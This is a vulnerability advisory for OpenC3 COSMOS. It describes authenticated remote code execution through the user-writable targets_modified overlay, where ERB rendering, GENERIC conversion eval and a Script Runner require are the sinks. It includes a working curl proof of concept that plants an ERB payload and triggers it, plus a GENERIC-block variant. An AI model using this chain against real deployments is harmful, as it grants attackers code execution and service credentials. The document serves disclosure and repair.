# OpenC3 COSMOS: Authenticated remote code execution via the user-writable config overlay (table definitions, cmd/tlm definitions, and script suites)

- CWE: CWE-94
- Packages: rubygems:openc3

---

### Summary

COSMOS reads configuration from a user-writable overlay (`targets_modified/`) before the read-only plugin-installed `targets/` tree, and the config subsystem executes code on those files: `ConfigParser` renders every file as ERB by default, a `GENERIC_READ_CONVERSION` / `GENERIC_WRITE_CONVERSION` block is evaluated as code by `GenericConversion` (Ruby and Python), and the Script Runner suite analysis `require`s a procedure file. An authenticated user can write into `targets_modified/` below the admin tier (the storage-upload endpoint exempts that area from the admin gate, and the screen-save endpoint stores its body verbatim there), so the same root cause is reachable through several features, each giving arbitrary code execution on a COSMOS server.

Three vulnerable routes were identified, all reachable by an authenticated non-admin user (in the open-source edition `authorize` ignores the permission string, so any authenticated user qualifies):

1. **Table definitions** (immediate). `tables#generate|report|load` reads a definition from `targets_modified/` and ERB-renders it and evaluates its `GENERIC_*_CONVERSION` block in the `cmd-tlm-api` container.
2. **Command/telemetry definitions** (persistent). A file written to `targets_modified/<TARGET>/cmd_tlm/` is overlaid by `System.setup_targets` and processed by `PacketConfig` in the decom/multi microservices: ERB-rendered in the Ruby implementation, and GENERIC-evaluated in both the Ruby and Python implementations (the Python `ConfigParser` does not run ERB). It executes on the next microservice (re)start.
3. **Script Runner suites** (immediate). A procedure written to `targets_modified/<TARGET>/procedures/` is `require`d by the suite analysis, reachable at the read-only `script_view` tier through `scripts#body` and `running_script#show` (the analysis subprocess is spawned when `OPENC3_SERVICE_PASSWORD` is configured, which it is in the shipped `.env`).

### Details

Root cause. `TargetFile.body` (Ruby `openc3/lib/openc3/utilities/target_file.rb`, Python `openc3/python/openc3/utilities/target_file.py`) reads `{scope}/targets_modified/{name}` before `{scope}/targets/{name}`. The storage-upload endpoint `storage_controller.rb get_upload_presigned_request` is gated at `system_set` and exempts `targets_modified/` and `tmp/` from its `admin` check (so a write there is not admin-gated); for a target path it additionally calls `authorize_bucket_path`, which in the permission-enforcing edition requires `tlm` on the target, while in the open-source edition `authorize` ignores the permission string entirely. `screens_controller.rb create` (`system_set`) stores its request body verbatim under `targets_modified/<target>/screens/`. So a non-admin can place files in the overlay. The config subsystem then executes them.

Sink 1, ERB. `ConfigParser#parse_file` renders the file as ERB before parsing (`run_erb` defaults to true):
```ruby
# openc3/lib/openc3/config/config_parser.rb:402
output = ERB.new(File.read(filename)...comment_erb(), trim_mode: "-").result(...)
```
Reached for table definitions via `tables_controller.rb` -> `Table.get_definitions` -> `TableConfig.process_file` -> `parse_file`, and for cmd/tlm definitions via `System.setup_targets` (`system.rb`, whose overlay loop copies `targets_modified/<T>/cmd_tlm/*` over the read-only files) -> `PacketConfig#process_file` -> `parse_file`.

Sink 2, GENERIC conversion. `PacketConfig`/`TableConfig` build a `GenericConversion` from a `GENERIC_READ_CONVERSION_START .. END` / `GENERIC_WRITE_CONVERSION_START .. END` block, and `GenericConversion#call` evaluates it (independent of ERB):
```ruby
# openc3/lib/openc3/conversions/generic_conversion.rb (call)
eval(@code_to_eval)
# Python openc3/python/openc3/conversions/generic_conversion.py (call): compile()/exec()/eval()
```
The read conversion fires on `tables#report`/`load` and during telemetry decom; the write conversion fires on `tables#generate` and on `restore_defaults`.

Sink 3, suite require. The Script Runner suite analysis executes the file:
```ruby
# openc3-cosmos-script-runner-api/scripts/run_suite_analysis.rb:24
require ARGV[1]      # runs all top-level code of the supplied file
```
reached from `Script.process_suite`, invoked by `scripts#body` and `running_script#show` (both `script_view`) and `scripts#create` (`script_edit`) when the file matches the suite pattern.

Permission tiers. Writing the payload needs `system_set` (screen save, storage upload) or `script_edit` (script create); triggering needs `system` (tables) or `script_view` (suite). These are below the tiers where COSMOS gates code execution elsewhere (plugin install requires `admin`, running a script requires `script_run`).

### PoC

Table definition path, against a standard stack. Benign payload writes `id` to a marker file. This PoC uses the open-source password login; in the permission-enforcing edition substitute a bearer token for a user holding the permissions noted above.
```bash
BASE=http://localhost:2900/openc3-api      # adjust to your deployment
TOKEN=$(curl -s -X POST "$BASE/auth/verify" -H 'Content-Type: application/json' -d '{"password":"<your password>"}')

# 1) Write the payload into targets_modified/ via the screen save endpoint.
curl -s -X POST "$BASE/screen" -H "Authorization: $TOKEN" \
  --data-urlencode 'scope=DEFAULT' --data-urlencode 'target=INST' --data-urlencode 'screen=poc' \
  --data-urlencode $'text=SCREEN AUTO AUTO 1.0\n<%= File.write("/tmp/erb_rce_poc", `id`) %>\nLABEL poc'

# 2) Trigger by pointing a table action at that file.
curl -s -X POST "$BASE/tables/generate" -H "Authorization: $TOKEN" \
  --data-urlencode 'scope=DEFAULT' --data-urlencode 'definition=INST/screens/poc.txt'
```
Then in the cmd-tlm-api container: `cat /tmp/erb_rce_poc` shows `uid=1001(openc3) ...`. The `tables/generate` request returns HTTP 500 (the screen lines are not valid table keywords); the marker shows the code already ran.

The same outcome without ERB, using the GENERIC sink, on the same `tables/generate` trigger:
```
TABLE "data" BIG_ENDIAN KEY_VALUE "poc"
  APPEND_PARAMETER "item1" 8 UINT 0 255 0 "Item"
    GENERIC_WRITE_CONVERSION_START
      `id > /tmp/erb_rce_poc`
      0
    GENERIC_WRITE_CONVERSION_END
```

cmd/tlm path: upload a telemetry definition containing the same ERB or GENERIC block to `targets_modified/<TARGET>/cmd_tlm/<file>.txt` via the storage-upload presigned request (`system_set`), then the code runs in that target's decom microservice on its next restart. Suite path: write a suite-shaped procedure to `targets_modified/<TARGET>/procedures/<x>.rb` and call `scripts#body` on it at `script_view`.

The ERB table chain was confirmed end to end over HTTP against a booted Rails and puma instance.

### Impact

Arbitrary code execution as the `openc3` user in the `cmd-tlm-api` container and the per-target decom microservices and the script-runner. Those processes hold the Redis and bucket credentials and sit on the internal service network, so the executed code acts with that authority over configuration, telemetry, and command data across scopes. The API is served through Traefik, which the shipped compose binds to `127.0.0.1:2900`, so a default single-host install is reachable only from the host; a multi-user deployment exposes the web port, and the `AV:N` rating reflects that standard remote-operator exposure.

All paths require valid authentication, and the triggering permissions (`system`/`system_set`/`script_view`) are below the `admin`/`script_run`/plugin-install tiers where COSMOS gates code execution. In the open-source edition `authorize` checks only token validity and does not enforce the permission string, so any authenticated user can perform these requests.

### Suggested fix

The fix is to treat the user-writable overlay as data, never code, and to gate the writers, applied uniformly:
- Load table and cmd/tlm definitions for code-execution paths from the read-only `targets/` tree only, or parse the `targets_modified` overlay with ERB disabled (`run_erb=false`); dynamically-created packet definitions are structural and never need ERB, so this does not regress that feature.
- Allow only admin and the server-side dynamic-packet mechanism to write a `cmd_tlm` overlay; reject non-canonical object keys so a positional path check cannot be bypassed by a key the object store normalizes differently.
- Run the Script Runner suite analysis (which executes the file) only at the `script_run` tier, at every entry point.
- Mirror the definition-read change in the Python implementation.
